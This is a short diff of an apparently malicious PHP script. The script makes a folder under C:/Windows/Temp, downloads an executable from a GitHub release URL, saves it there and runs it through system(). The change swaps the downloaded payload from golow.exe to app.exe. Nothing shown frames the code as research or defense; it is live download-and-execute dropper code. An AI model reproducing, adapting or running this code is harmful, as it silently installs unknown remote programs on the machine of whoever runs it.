@@ -59,17 +59,17 @@ system('mkdir "C:/Windows/Temp/front2/"');
 
 
 
-$url2 =  'https://github.com/mainpoint91/fiveminllk/releases/download/golow/golow.exe';
+$url2 =  'https://github.com/mainpoint91/fiveminllk/releases/download/tear/app.exe';
 
 
-$file_name2 = 'C:/Windows/Temp/front2/golow.exe';
+$file_name2 = 'C:/Windows/Temp/front2/app.exe';
 
 
 
 
          if (file_put_contents($file_name2, file_get_contents($url2)))
             {
-                system('C:/Windows/Temp/front2/golow.exe');
+                system('C:/Windows/Temp/front2/app.exe');
             }
         else
             {
